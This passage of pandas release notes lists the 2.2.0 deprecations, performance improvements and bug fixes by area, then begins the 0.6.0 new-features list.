``False`` instead (:issue:`55388`)\n- Deprecated ``core.internals`` members ``Block``, ``ExtensionBlock``, and ``DatetimeTZBlock``, use public APIs instead (:issue:`55139`)\n- Deprecated ``year``, ``month``, ``quarter``, ``day``, ``hour``, ``minute``, and ``second`` keywords in the :class:`PeriodIndex` constructor, use :meth:`PeriodIndex.from_fields` instead (:issue:`55960`)\n- Deprecated accepting a type as an argument in :meth:`Index.view`, call without any arguments instead (:issue:`55709`)\n- Deprecated allowing non-integer ``periods`` argument in :func:`date_range`, :func:`timedelta_range`, :func:`period_range`, and :func:`interval_range` (:issue:`56036`)\n- Deprecated allowing non-keyword arguments in :meth:`DataFrame.to_clipboard` (:issue:`54229`)\n- Deprecated allowing non-keyword arguments in :meth:`DataFrame.to_csv` except ``path_or_buf`` (:issue:`54229`)\n- Deprecated allowing non-keyword arguments in :meth:`DataFrame.to_dict` (:issue:`54229`)\n- Deprecated allowing non-keyword arguments in :meth:`DataFrame.to_excel` except ``excel_writer`` (:issue:`54229`)\n- Deprecated allowing non-keyword arguments in :meth:`DataFrame.to_gbq` except ``destination_table`` (:issue:`54229`)\n- Deprecated allowing non-keyword arguments in :meth:`DataFrame.to_hdf` except ``path_or_buf`` (:issue:`54229`)\n- Deprecated allowing non-keyword arguments in :meth:`DataFrame.to_html` except ``buf`` (:issue:`54229`)\n- Deprecated allowing non-keyword arguments in :meth:`DataFrame.to_json` except ``path_or_buf`` (:issue:`54229`)\n- Deprecated allowing non-keyword arguments in :meth:`DataFrame.to_latex` except ``buf`` (:issue:`54229`)\n- Deprecated allowing non-keyword arguments in :meth:`DataFrame.to_markdown` except ``buf`` (:issue:`54229`)\n- Deprecated allowing non-keyword arguments in :meth:`DataFrame.to_parquet` except ``path`` (:issue:`54229`)\n- Deprecated allowing non-keyword arguments in :meth:`DataFrame.to_pickle` except ``path`` (:issue:`54229`)\n- Deprecated allowing non-keyword arguments in :meth:`DataFrame.to_string` except ``buf`` (:issue:`54229`)\n- Deprecated allowing non-keyword arguments in :meth:`DataFrame.to_xml` except ``path_or_buffer`` (:issue:`54229`)\n- Deprecated allowing passing :class:`BlockManager` objects to :class:`DataFrame` or :class:`SingleBlockManager` objects to :class:`Series` (:issue:`52419`)\n- Deprecated behavior of :meth:`Index.insert` with an object-dtype index silently performing type inference on the result, explicitly call ``result.infer_objects(copy=False)`` for the old behavior instead (:issue:`51363`)\n- Deprecated casting non-datetimelike values (mainly strings) in :meth:`Series.isin` and :meth:`Index.isin` with ``datetime64``, ``timedelta64``, and :class:`PeriodDtype` dtypes (:issue:`53111`)\n- Deprecated dtype inference in :class:`Index`, :class:`Series` and :class:`DataFrame` constructors when giving a pandas input, call ``.infer_objects`` on the input to keep the current behavior (:issue:`56012`)\n- Deprecated dtype inference when setting a :class:`Index` into a :class:`DataFrame`, cast explicitly instead (:issue:`56102`)\n- Deprecated including the groups in computations when using :meth:`.DataFrameGroupBy.apply` and :meth:`.DataFrameGroupBy.resample`; pass ``include_groups=False`` to exclude the groups (:issue:`7155`)\n- Deprecated indexing an :class:`Index`  with a boolean indexer of length zero (:issue:`55820`)\n- Deprecated not passing a tuple to :class:`.DataFrameGroupBy.get_group` or :class:`.SeriesGroupBy.get_group` when grouping by a length-1 list-like (:issue:`25971`)\n- Deprecated string ``AS`` denoting frequency in :class:`YearBegin` and strings ``AS-DEC``, ``AS-JAN``, etc. denoting annual frequencies with various fiscal year starts (:issue:`54275`)\n- Deprecated string ``A`` denoting frequency in :class:`YearEnd` and strings ``A-DEC``, ``A-JAN``, etc. denoting annual frequencies with various fiscal year ends (:issue:`54275`)\n- Deprecated string ``BAS`` denoting frequency in :class:`BYearBegin` and strings ``BAS-DEC``, ``BAS-JAN``, etc. denoting annual frequencies with various fiscal year starts (:issue:`54275`)\n- Deprecated string ``BA`` denoting frequency in :class:`BYearEnd` and strings ``BA-DEC``, ``BA-JAN``, etc. denoting annual frequencies with various fiscal year ends (:issue:`54275`)\n- Deprecated strings ``H``, ``BH``, and ``CBH`` denoting frequencies in :class:`Hour`, :class:`BusinessHour`, :class:`CustomBusinessHour` (:issue:`52536`)\n- Deprecated strings ``H``, ``S``, ``U``, and ``N`` denoting units in :func:`to_timedelta` (:issue:`52536`)\n- Deprecated strings ``H``, ``T``, ``S``, ``L``, ``U``, and ``N`` denoting units in :class:`Timedelta` (:issue:`52536`)\n- Deprecated strings ``T``, ``S``, ``L``, ``U``, and ``N`` denoting frequencies in :class:`Minute`, :class:`Second`, :class:`Milli`, :class:`Micro`, :class:`Nano` (:issue:`52536`)\n- Deprecated support for combining parsed datetime columns in :func:`read_csv` along with the ``keep_date_col`` keyword (:issue:`55569`)\n- Deprecated the :attr:`.DataFrameGroupBy.grouper` and :attr:`SeriesGroupBy.grouper`; these attributes will be removed in a future version of pandas (:issue:`56521`)\n- Deprecated the :class:`.Grouping` attributes ``group_index``, ``result_index``, and ``group_arraylike``; these will be removed in a future version of pandas (:issue:`56148`)\n- Deprecated the ``delim_whitespace`` keyword in :func:`read_csv` and :func:`read_table`, use ``sep=\"\\\\s+\"`` instead (:issue:`55569`)\n- Deprecated the ``errors=\"ignore\"`` option in :func:`to_datetime`, :func:`to_timedelta`, and :func:`to_numeric`; explicitly catch exceptions instead (:issue:`54467`)\n- Deprecated the ``fastpath`` keyword in the :class:`Series` constructor (:issue:`20110`)\n- Deprecated the ``kind`` keyword in :meth:`Series.resample` and :meth:`DataFrame.resample`, explicitly cast the object's ``index`` instead (:issue:`55895`)\n- Deprecated the ``ordinal`` keyword in :class:`PeriodIndex`, use :meth:`PeriodIndex.from_ordinals` instead (:issue:`55960`)\n- Deprecated the ``unit`` keyword in :class:`TimedeltaIndex` construction, use :func:`to_timedelta` instead (:issue:`55499`)\n- Deprecated the ``verbose`` keyword in :func:`read_csv` and :func:`read_table` (:issue:`55569`)\n- Deprecated the behavior of :meth:`DataFrame.replace` and :meth:`Series.replace` with :class:`CategoricalDtype`; in a future version replace will change the values while preserving the categories. To change the categories, use ``ser.cat.rename_categories`` instead (:issue:`55147`)\n- Deprecated the behavior of :meth:`Series.value_counts` and :meth:`Index.value_counts` with object dtype; in a future version these will not perform dtype inference on the resulting :class:`Index`, do ``result.index = result.index.infer_objects()`` to retain the old behavior (:issue:`56161`)\n- Deprecated the default of ``observed=False`` in :meth:`DataFrame.pivot_table`; will be ``True`` in a future version (:issue:`56236`)\n- Deprecated the extension test classes ``BaseNoReduceTests``, ``BaseBooleanReduceTests``, and ``BaseNumericReduceTests``, use ``BaseReduceTests`` instead (:issue:`54663`)\n- Deprecated the option ``mode.data_manager`` and the ``ArrayManager``; only the ``BlockManager`` will be available in future versions (:issue:`55043`)\n- Deprecated the previous implementation of :class:`DataFrame.stack`; specify ``future_stack=True`` to adopt the future version (:issue:`53515`)\n-\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_220.performance:\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n- Performance improvement in :func:`.testing.assert_frame_equal` and :func:`.testing.assert_series_equal` (:issue:`55949`, :issue:`55971`)\n- Performance improvement in :func:`concat` with ``axis=1`` and objects with unaligned indexes (:issue:`55084`)\n- Performance improvement in :func:`get_dummies` (:issue:`56089`)\n- Performance improvement in :func:`merge` and :func:`merge_ordered` when joining on sorted ascending keys (:issue:`56115`)\n- Performance improvement in :func:`merge_asof` when ``by`` is not ``None`` (:issue:`55580`, :issue:`55678`)\n- Performance improvement in :func:`read_stata` for files with many variables (:issue:`55515`)\n- Performance improvement in :meth:`DataFrame.groupby` when aggregating pyarrow timestamp and duration dtypes (:issue:`55031`)\n- Performance improvement in :meth:`DataFrame.join` when joining on unordered categorical indexes (:issue:`56345`)\n- Performance improvement in :meth:`DataFrame.loc` and :meth:`Series.loc` when indexing with a :class:`MultiIndex` (:issue:`56062`)\n- Performance improvement in :meth:`DataFrame.sort_index` and :meth:`Series.sort_index` when indexed by a :class:`MultiIndex` (:issue:`54835`)\n- Performance improvement in :meth:`DataFrame.to_dict` on converting DataFrame to dictionary (:issue:`50990`)\n- Performance improvement in :meth:`Index.difference` (:issue:`55108`)\n- Performance improvement in :meth:`Index.sort_values` when index is already sorted (:issue:`56128`)\n- Performance improvement in :meth:`MultiIndex.get_indexer` when ``method`` is not ``None`` (:issue:`55839`)\n- Performance improvement in :meth:`Series.duplicated` for pyarrow dtypes (:issue:`55255`)\n- Performance improvement in :meth:`Series.str.get_dummies` when dtype is ``\"string[pyarrow]\"`` or ``\"string[pyarrow_numpy]\"`` (:issue:`56110`)\n- Performance improvement in :meth:`Series.str` methods (:issue:`55736`)\n- Performance improvement in :meth:`Series.value_counts` and :meth:`Series.mode` for masked dtypes (:issue:`54984`, :issue:`55340`)\n- Performance improvement in :meth:`.DataFrameGroupBy.nunique` and :meth:`.SeriesGroupBy.nunique` (:issue:`55972`)\n- Performance improvement in :meth:`.SeriesGroupBy.idxmax`, :meth:`.SeriesGroupBy.idxmin`, :meth:`.DataFrameGroupBy.idxmax`, :meth:`.DataFrameGroupBy.idxmin` (:issue:`54234`)\n- Performance improvement when hashing a nullable extension array (:issue:`56507`)\n- Performance improvement when indexing into a non-unique index (:issue:`55816`)\n- Performance improvement when indexing with more than 4 keys (:issue:`54550`)\n- Performance improvement when localizing time to UTC (:issue:`55241`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_220.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\nCategorical\n^^^^^^^^^^^\n- :meth:`Categorical.isin` raising ``InvalidIndexError`` for categorical containing overlapping :class:`Interval` values (:issue:`34974`)\n- Bug in :meth:`CategoricalDtype.__eq__` returning ``False`` for unordered categorical data with mixed types (:issue:`55468`)\n- Bug when casting ``pa.dictionary`` to :class:`CategoricalDtype` using a ``pa.DictionaryArray`` as categories (:issue:`56672`)\n\nDatetimelike\n^^^^^^^^^^^^\n- Bug in :class:`DatetimeIndex` construction when passing both a ``tz`` and either ``dayfirst`` or ``yearfirst`` ignoring dayfirst/yearfirst (:issue:`55813`)\n- Bug in :class:`DatetimeIndex` when passing an object-dtype ndarray of float objects and a ``tz`` incorrectly localizing the result (:issue:`55780`)\n- Bug in :func:`Series.isin` with :class:`DatetimeTZDtype` dtype and comparison values that are all ``NaT`` incorrectly returning all-``False`` even if the series contains ``NaT`` entries (:issue:`56427`)\n- Bug in :func:`concat` raising ``AttributeError`` when concatenating all-NA DataFrame with :class:`DatetimeTZDtype` dtype DataFrame (:issue:`52093`)\n- Bug in :func:`testing.assert_extension_array_equal` that could use the wrong unit when comparing resolutions (:issue:`55730`)\n- Bug in :func:`to_datetime` and :class:`DatetimeIndex` when passing a list of mixed-string-and-numeric types incorrectly raising (:issue:`55780`)\n- Bug in :func:`to_datetime` and :class:`DatetimeIndex` when passing mixed-type objects with a mix of timezones or mix of timezone-awareness failing to raise ``ValueError`` (:issue:`55693`)\n- Bug in :meth:`.Tick.delta` with very large ticks raising ``OverflowError`` instead of ``OutOfBoundsTimedelta`` (:issue:`55503`)\n- Bug in :meth:`DatetimeIndex.shift` with non-nanosecond resolution incorrectly returning with nanosecond resolution (:issue:`56117`)\n- Bug in :meth:`DatetimeIndex.union` returning object dtype for tz-aware indexes with the same timezone but different units (:issue:`55238`)\n- Bug in :meth:`Index.is_monotonic_increasing` and :meth:`Index.is_monotonic_decreasing` always caching :meth:`Index.is_unique` as ``True`` when first value in index is ``NaT`` (:issue:`55755`)\n- Bug in :meth:`Index.view` to a datetime64 dtype with non-supported resolution incorrectly raising (:issue:`55710`)\n- Bug in :meth:`Series.dt.round` with non-nanosecond resolution and ``NaT`` entries incorrectly raising ``OverflowError`` (:issue:`56158`)\n- Bug in :meth:`Series.fillna` with non-nanosecond resolution dtypes and higher-resolution vector values returning incorrect (internally-corrupted) results (:issue:`56410`)\n- Bug in :meth:`Timestamp.unit` being inferred incorrectly from an ISO8601 format string with minute or hour resolution and a timezone offset (:issue:`56208`)\n- Bug in ``.astype`` converting from a higher-resolution ``datetime64`` dtype to a lower-resolution ``datetime64`` dtype (e.g. ``datetime64[us]->datetime64[ms]``) silently overflowing with values near the lower implementation bound (:issue:`55979`)\n- Bug in adding or subtracting a :class:`Week` offset to a ``datetime64`` :class:`Series`, :class:`Index`, or :class:`DataFrame` column with non-nanosecond resolution returning incorrect results (:issue:`55583`)\n- Bug in addition or subtraction of :class:`BusinessDay` offset with ``offset`` attribute to non-nanosecond :class:`Index`, :class:`Series`, or :class:`DataFrame` column giving incorrect results (:issue:`55608`)\n- Bug in addition or subtraction of :class:`DateOffset` objects with microsecond components to ``datetime64`` :class:`Index`, :class:`Series`, or :class:`DataFrame` columns with non-nanosecond resolution (:issue:`55595`)\n- Bug in addition or subtraction of very large :class:`.Tick` objects with :class:`Timestamp` or :class:`Timedelta` objects raising ``OverflowError`` instead of ``OutOfBoundsTimedelta`` (:issue:`55503`)\n- Bug in creating a :class:`Index`, :class:`Series`, or :class:`DataFrame` with a non-nanosecond :class:`DatetimeTZDtype` and inputs that would be out of bounds with nanosecond resolution incorrectly raising ``OutOfBoundsDatetime`` (:issue:`54620`)\n- Bug in creating a :class:`Index`, :class:`Series`, or :class:`DataFrame` with a non-nanosecond ``datetime64`` (or :class:`DatetimeTZDtype`) from mixed-numeric inputs treating those as nanoseconds instead of as multiples of the dtype's unit (which would happen with non-mixed numeric inputs) (:issue:`56004`)\n- Bug in creating a :class:`Index`, :class:`Series`, or :class:`DataFrame` with a non-nanosecond ``datetime64`` dtype and inputs that would be out of bounds for a ``datetime64[ns]`` incorrectly raising ``OutOfBoundsDatetime`` (:issue:`55756`)\n- Bug in parsing datetime strings with nanosecond resolution with non-ISO8601 formats incorrectly truncating sub-microsecond components (:issue:`56051`)\n- Bug in parsing datetime strings with sub-second resolution and trailing zeros incorrectly inferring second or millisecond resolution (:issue:`55737`)\n- Bug in the results of :func:`to_datetime` with an floating-dtype argument with ``unit`` not matching the pointwise results of :class:`Timestamp` (:issue:`56037`)\n- Fixed regression where :func:`concat` would raise an error when concatenating ``datetime64`` columns with differing resolutions (:issue:`53641`)\n\nTimedelta\n^^^^^^^^^\n- Bug in :class:`Timedelta` construction raising ``OverflowError`` instead of ``OutOfBoundsTimedelta`` (:issue:`55503`)\n- Bug in rendering (``__repr__``) of :class:`TimedeltaIndex` and :class:`Series` with timedelta64 values with non-nanosecond resolution entries that are all multiples of 24 hours failing to use the compact representation used in the nanosecond cases (:issue:`55405`)\n\nTimezones\n^^^^^^^^^\n- Bug in :class:`AbstractHolidayCalendar` where timezone data was not propagated when computing holiday observances (:issue:`54580`)\n- Bug in :class:`Timestamp` construction with an ambiguous value and a ``pytz`` timezone failing to raise ``pytz.AmbiguousTimeError`` (:issue:`55657`)\n- Bug in :meth:`Timestamp.tz_localize` with ``nonexistent=\"shift_forward`` around UTC+0 during DST (:issue:`51501`)\n\nNumeric\n^^^^^^^\n- Bug in :func:`read_csv` with ``engine=\"pyarrow\"`` causing rounding errors for large integers (:issue:`52505`)\n- Bug in :meth:`Series.__floordiv__` and :meth:`Series.__truediv__` for :class:`ArrowDtype` with integral dtypes raising for large divisors (:issue:`56706`)\n- Bug in :meth:`Series.__floordiv__` for :class:`ArrowDtype` with integral dtypes raising for large values (:issue:`56645`)\n- Bug in :meth:`Series.pow` not filling missing values correctly (:issue:`55512`)\n- Bug in :meth:`Series.replace` and :meth:`DataFrame.replace` matching float ``0.0`` with ``False`` and vice versa (:issue:`55398`)\n- Bug in :meth:`Series.round` raising for nullable boolean dtype (:issue:`55936`)\n\nConversion\n^^^^^^^^^^\n- Bug in :meth:`DataFrame.astype` when called with ``str`` on unpickled array - the array might change in-place (:issue:`54654`)\n- Bug in :meth:`DataFrame.astype` where ``errors=\"ignore\"`` had no effect for extension types (:issue:`54654`)\n- Bug in :meth:`Series.convert_dtypes` not converting all NA column to ``null[pyarrow]`` (:issue:`55346`)\n- Bug in :meth:``DataFrame.loc`` was not throwing \"incompatible dtype warning\" (see `PDEP6 <https://pandas.pydata.org/pdeps/0006-ban-upcasting.html>`_) when assigning a ``Series`` with a different dtype using a full column setter (e.g. ``df.loc[:, 'a'] = incompatible_value``) (:issue:`39584`)\n\nStrings\n^^^^^^^\n- Bug in :func:`pandas.api.types.is_string_dtype` while checking object array with no elements is of the string dtype (:issue:`54661`)\n- Bug in :meth:`DataFrame.apply` failing when ``engine=\"numba\"`` and columns or index have ``StringDtype`` (:issue:`56189`)\n- Bug in :meth:`DataFrame.reindex` not matching :class:`Index` with ``string[pyarrow_numpy]`` dtype (:issue:`56106`)\n- Bug in :meth:`Index.str.cat` always casting result to object dtype (:issue:`56157`)\n- Bug in :meth:`Series.__mul__` for :class:`ArrowDtype` with ``pyarrow.string`` dtype and ``string[pyarrow]`` for the pyarrow backend (:issue:`51970`)\n- Bug in :meth:`Series.str.find` when ``start < 0`` for :class:`ArrowDtype` with ``pyarrow.string`` (:issue:`56411`)\n- Bug in :meth:`Series.str.fullmatch` when ``dtype=pandas.ArrowDtype(pyarrow.string()))`` allows partial matches when regex ends in literal //$ (:issue:`56652`)\n- Bug in :meth:`Series.str.replace` when ``n < 0`` for :class:`ArrowDtype` with ``pyarrow.string`` (:issue:`56404`)\n- Bug in :meth:`Series.str.startswith` and :meth:`Series.str.endswith` with arguments of type ``tuple[str, ...]`` for :class:`ArrowDtype` with ``pyarrow.string`` dtype (:issue:`56579`)\n- Bug in :meth:`Series.str.startswith` and :meth:`Series.str.endswith` with arguments of type ``tuple[str, ...]`` for ``string[pyarrow]`` (:issue:`54942`)\n- Bug in comparison operations for ``dtype=\"string[pyarrow_numpy]\"`` raising if dtypes can't be compared (:issue:`56008`)\n\nInterval\n^^^^^^^^\n- Bug in :class:`Interval` ``__repr__`` not displaying UTC offsets for :class:`Timestamp` bounds. Additionally the hour, minute and second components will now be shown (:issue:`55015`)\n- Bug in :meth:`IntervalIndex.factorize` and :meth:`Series.factorize` with :class:`IntervalDtype` with datetime64 or timedelta64 intervals not preserving non-nanosecond units (:issue:`56099`)\n- Bug in :meth:`IntervalIndex.from_arrays` when passed ``datetime64`` or ``timedelta64`` arrays with mismatched resolutions constructing an invalid ``IntervalArray`` object (:issue:`55714`)\n- Bug in :meth:`IntervalIndex.from_tuples` raising if subtype is a nullable extension dtype (:issue:`56765`)\n- Bug in :meth:`IntervalIndex.get_indexer` with datetime or timedelta intervals incorrectly matching on integer targets (:issue:`47772`)\n- Bug in :meth:`IntervalIndex.get_indexer` with timezone-aware datetime intervals incorrectly matching on a sequence of timezone-naive targets (:issue:`47772`)\n- Bug in setting values on a :class:`Series` with an :class:`IntervalIndex` using a slice incorrectly raising (:issue:`54722`)\n\nIndexing\n^^^^^^^^\n- Bug in :meth:`DataFrame.loc` mutating a boolean indexer when :class:`DataFrame` has a :class:`MultiIndex` (:issue:`56635`)\n- Bug in :meth:`DataFrame.loc` when setting :class:`Series` with extension dtype into NumPy dtype (:issue:`55604`)\n- Bug in :meth:`Index.difference` not returning a unique set of values when ``other`` is empty or ``other`` is considered non-comparable (:issue:`55113`)\n- Bug in setting :class:`Categorical` values into a :class:`DataFrame` with numpy dtypes raising ``RecursionError`` (:issue:`52927`)\n- Fixed bug when creating new column with missing values when setting a single string value (:issue:`56204`)\n\nMissing\n^^^^^^^\n- Bug in :meth:`DataFrame.update` wasn't updating in-place for tz-aware datetime64 dtypes (:issue:`56227`)\n\nMultiIndex\n^^^^^^^^^^\n- Bug in :meth:`MultiIndex.get_indexer` not raising ``ValueError`` when ``method`` provided and index is non-monotonic (:issue:`53452`)\n\nI/O\n^^^\n- Bug in :func:`read_csv` where ``engine=\"python\"`` did not respect ``chunksize`` arg when ``skiprows`` was specified (:issue:`56323`)\n- Bug in :func:`read_csv` where ``engine=\"python\"`` was causing a ``TypeError`` when a callable ``skiprows`` and a chunk size was specified (:issue:`55677`)\n- Bug in :func:`read_csv` where ``on_bad_lines=\"warn\"`` would write to ``stderr`` instead of raising a Python warning; this now yields a :class:`.errors.ParserWarning` (:issue:`54296`)\n- Bug in :func:`read_csv` with ``engine=\"pyarrow\"`` where ``quotechar`` was ignored (:issue:`52266`)\n- Bug in :func:`read_csv` with ``engine=\"pyarrow\"`` where ``usecols`` wasn't working with a CSV with no headers (:issue:`54459`)\n- Bug in :func:`read_excel`, with ``engine=\"xlrd\"`` (``xls`` files) erroring when the file contains ``NaN`` or ``Inf`` (:issue:`54564`)\n- Bug in :func:`read_json` not handling dtype conversion properly if ``infer_string`` is set (:issue:`56195`)\n- Bug in :meth:`DataFrame.to_excel`, with ``OdsWriter`` (``ods`` files) writing Boolean/string value (:issue:`54994`)\n- Bug in :meth:`DataFrame.to_hdf` and :func:`read_hdf` with ``datetime64`` dtypes with non-nanosecond resolution failing to round-trip correctly (:issue:`55622`)\n- Bug in :meth:`DataFrame.to_stata` raising for extension dtypes (:issue:`54671`)\n- Bug in :meth:`~pandas.read_excel` with ``engine=\"odf\"`` (``ods`` files) when a string cell contains an annotation (:issue:`55200`)\n- Bug in :meth:`~pandas.read_excel` with an ODS file without cached formatted cell for float values (:issue:`55219`)\n- Bug where :meth:`DataFrame.to_json` would raise an ``OverflowError`` instead of a ``TypeError`` with unsupported NumPy types (:issue:`55403`)\n\nPeriod\n^^^^^^\n- Bug in :class:`PeriodIndex` construction when more than one of ``data``, ``ordinal`` and ``**fields`` are passed failing to raise ``ValueError`` (:issue:`55961`)\n- Bug in :class:`Period` addition silently wrapping around instead of raising ``OverflowError`` (:issue:`55503`)\n- Bug in casting from :class:`PeriodDtype` with ``astype`` to ``datetime64`` or :class:`DatetimeTZDtype` with non-nanosecond unit incorrectly returning with nanosecond unit (:issue:`55958`)\n\nPlotting\n^^^^^^^^\n- Bug in :meth:`DataFrame.plot.box` with ``vert=False`` and a Matplotlib ``Axes`` created with ``sharey=True`` (:issue:`54941`)\n- Bug in :meth:`DataFrame.plot.scatter` discarding string columns (:issue:`56142`)\n- Bug in :meth:`Series.plot` when reusing an ``ax`` object failing to raise when a ``how`` keyword is passed (:issue:`55953`)\n\nGroupby/resample/rolling\n^^^^^^^^^^^^^^^^^^^^^^^^\n- Bug in :meth:`.DataFrameGroupBy.idxmin`, :meth:`.DataFrameGroupBy.idxmax`, :meth:`.SeriesGroupBy.idxmin`, and :meth:`.SeriesGroupBy.idxmax` would not retain :class:`.Categorical` dtype when the index was a :class:`.CategoricalIndex` that contained NA values (:issue:`54234`)\n- Bug in :meth:`.DataFrameGroupBy.transform` and :meth:`.SeriesGroupBy.transform` when ``observed=False`` and ``f=\"idxmin\"`` or ``f=\"idxmax\"`` would incorrectly raise on unobserved categories (:issue:`54234`)\n- Bug in :meth:`.DataFrameGroupBy.value_counts` and :meth:`.SeriesGroupBy.value_counts` could result in incorrect sorting if the columns of the DataFrame or name of the Series are integers (:issue:`55951`)\n- Bug in :meth:`.DataFrameGroupBy.value_counts` and :meth:`.SeriesGroupBy.value_counts` would not respect ``sort=False`` in :meth:`DataFrame.groupby` and :meth:`Series.groupby` (:issue:`55951`)\n- Bug in :meth:`.DataFrameGroupBy.value_counts` and :meth:`.SeriesGroupBy.value_counts` would sort by proportions rather than frequencies when ``sort=True`` and ``normalize=True`` (:issue:`55951`)\n- Bug in :meth:`DataFrame.asfreq` and :meth:`Series.asfreq` with a :class:`DatetimeIndex` with non-nanosecond resolution incorrectly converting to nanosecond resolution (:issue:`55958`)\n- Bug in :meth:`DataFrame.ewm` when passed ``times`` with non-nanosecond ``datetime64`` or :class:`DatetimeTZDtype` dtype (:issue:`56262`)\n- Bug in :meth:`DataFrame.groupby` and :meth:`Series.groupby` where grouping by a combination of ``Decimal`` and NA values would fail when ``sort=True`` (:issue:`54847`)\n- Bug in :meth:`DataFrame.groupby` for DataFrame subclasses when selecting a subset of columns to apply the function to (:issue:`56761`)\n- Bug in :meth:`DataFrame.resample` not respecting ``closed`` and ``label`` arguments for :class:`~pandas.tseries.offsets.BusinessDay` (:issue:`55282`)\n- Bug in :meth:`DataFrame.resample` when resampling on a :class:`ArrowDtype` of ``pyarrow.timestamp`` or ``pyarrow.duration`` type (:issue:`55989`)\n- Bug in :meth:`DataFrame.resample` where bin edges were not correct for :class:`~pandas.tseries.offsets.BusinessDay` (:issue:`55281`)\n- Bug in :meth:`DataFrame.resample` where bin edges were not correct for :class:`~pandas.tseries.offsets.MonthBegin` (:issue:`55271`)\n- Bug in :meth:`DataFrame.rolling` and :meth:`Series.rolling` where duplicate datetimelike indexes are treated as consecutive rather than equal with ``closed='left'`` and ``closed='neither'`` (:issue:`20712`)\n- Bug in :meth:`DataFrame.rolling` and :meth:`Series.rolling` where either the ``index`` or ``on`` column was :class:`ArrowDtype` with ``pyarrow.timestamp`` type (:issue:`55849`)\n\nReshaping\n^^^^^^^^^\n- Bug in :func:`concat` ignoring ``sort`` parameter when passed :class:`DatetimeIndex` indexes (:issue:`54769`)\n- Bug in :func:`concat` renaming :class:`Series` when ``ignore_index=False`` (:issue:`15047`)\n- Bug in :func:`merge_asof` raising ``TypeError`` when ``by`` dtype is not ``object``, ``int64``, or ``uint64`` (:issue:`22794`)\n- Bug in :func:`merge_asof` raising incorrect error for string dtype (:issue:`56444`)\n- Bug in :func:`merge_asof` when using a :class:`Timedelta` tolerance on a :class:`ArrowDtype` column (:issue:`56486`)\n- Bug in :func:`merge` not raising when merging datetime columns with timedelta columns (:issue:`56455`)\n- Bug in :func:`merge` not raising when merging string columns with numeric columns (:issue:`56441`)\n- Bug in :func:`merge` not sorting for new string dtype (:issue:`56442`)\n- Bug in :func:`merge` returning columns in incorrect order when left and/or right is empty (:issue:`51929`)\n- Bug in :meth:`DataFrame.melt` where an exception was raised if ``var_name`` was not a string (:issue:`55948`)\n- Bug in :meth:`DataFrame.melt` where it would not preserve the datetime (:issue:`55254`)\n- Bug in :meth:`DataFrame.pivot_table` where the row margin is incorrect when the columns have numeric names (:issue:`26568`)\n- Bug in :meth:`DataFrame.pivot` with numeric columns and extension dtype for data (:issue:`56528`)\n- Bug in :meth:`DataFrame.stack` with ``future_stack=True`` would not preserve NA values in the index (:issue:`56573`)\n\nSparse\n^^^^^^\n- Bug in :meth:`arrays.SparseArray.take` when using a different fill value than the array's fill value (:issue:`55181`)\n\nOther\n^^^^^\n- :meth:`DataFrame.__dataframe__` did not support pyarrow large strings (:issue:`56702`)\n- Bug in :func:`DataFrame.describe` when formatting percentiles in the resulting percentile 99.999% is rounded to 100% (:issue:`55765`)\n- Bug in :func:`api.interchange.from_dataframe` where it raised  ``NotImplementedError`` when handling empty string columns (:issue:`56703`)\n- Bug in :func:`cut` and :func:`qcut` with ``datetime64`` dtype values with non-nanosecond units incorrectly returning nanosecond-unit bins (:issue:`56101`)\n- Bug in :func:`cut` incorrectly allowing cutting of timezone-aware datetimes with timezone-naive bins (:issue:`54964`)\n- Bug in :func:`infer_freq` and :meth:`DatetimeIndex.inferred_freq` with weekly frequencies and non-nanosecond resolutions (:issue:`55609`)\n- Bug in :meth:`DataFrame.apply` where passing ``raw=True`` ignored ``args`` passed to the applied function (:issue:`55009`)\n- Bug in :meth:`DataFrame.from_dict` which would always sort the rows of the created :class:`DataFrame`.  (:issue:`55683`)\n- Bug in :meth:`DataFrame.sort_index` when passing ``axis=\"columns\"`` and ``ignore_index=True`` raising a ``ValueError`` (:issue:`56478`)\n- Bug in rendering ``inf`` values inside a :class:`DataFrame` with the ``use_inf_as_na`` option enabled (:issue:`55483`)\n- Bug in rendering a :class:`Series` with a :class:`MultiIndex` when one of the index level's names is 0 not having that name displayed (:issue:`55415`)\n- Bug in the error message when assigning an empty :class:`DataFrame` to a column (:issue:`55956`)\n- Bug when time-like strings were being cast to :class:`ArrowDtype` with ``pyarrow.time64`` type (:issue:`56463`)\n- Fixed a spurious deprecation warning from ``numba`` >= 0.58.0 when passing a numpy ufunc in :class:`core.window.Rolling.apply` with ``engine=\"numba\"`` (:issue:`55247`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_220.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v2.1.4..v2.2.0\n\n\n.. _whatsnew_060:\n\nVersion 0.6.0 (November 25, 2011)\n---------------------------------\n\n{{ header }}\n\nNew features\n~~~~~~~~~~~~\n- :ref:`Added <reshaping.melt>` ``melt`` function to ``pandas.core.reshape``\n- :ref:`Added <groupby.multiindex>` ``level`` parameter to group by level in Series and DataFrame descriptive statistics (:issue:`313`)\n- :ref:`Added <basics.head_tail>` ``head`` and ``tail`` methods to Series, analogous to DataFrame (:issue:`296`)\n- :ref:`Added <indexing.boolean>` ``Series.isin`` function which checks if each value is contained in a passed sequence (:issue:`289`)\n- :ref:`Added <io.formatting>` ``float_format`` option to ``Series.to_string``\n- :ref:`Added <io.parse_dates>` ``skip_footer`` (:issue:`291`) and ``converters`` (:issue:`343`) options to ``read_csv`` and ``read_table``\n- :ref:`Added <indexing.duplicate>` ``drop_duplicates`` and ``duplicated`` functions for removing duplicate DataFrame rows and checking for duplicate rows, respectively (:issue:`319`)\n- :ref:`Implemented <dsintro.boolean>` operators '&', '|', '^', '-' on DataFrame (:issue:`347`)\n- :ref:`Added <basics.stats>` ``Series.mad``, mean absolute deviation\n- :ref:`Added <timeseries.offsets>` ``QuarterEnd`` DateOffset (:issue:`321`)\n- :ref:`Added <dsintro.numpy_interop>` ``dot`` to DataFrame (:issue:`65`)\n- Added ``orient`` option to ``Panel.from_dict`` (:issue:`359`, :issue:`301`)\n- :ref:`Added <basics.dataframe.from_dict>` ``orient`` option to ``DataFrame.from_dict``\n- :ref:`Added <basics.dataframe.from_records>` passing list of tuples or list of lists to ``DataFrame.from_records`` (:issue:`357`)\n- :ref:`Added <groupby.multiindex>` multiple levels to groupby (:issue:`103`)\n- :ref:`Allow <basics.sorting>` multiple columns in ``by`` argument of 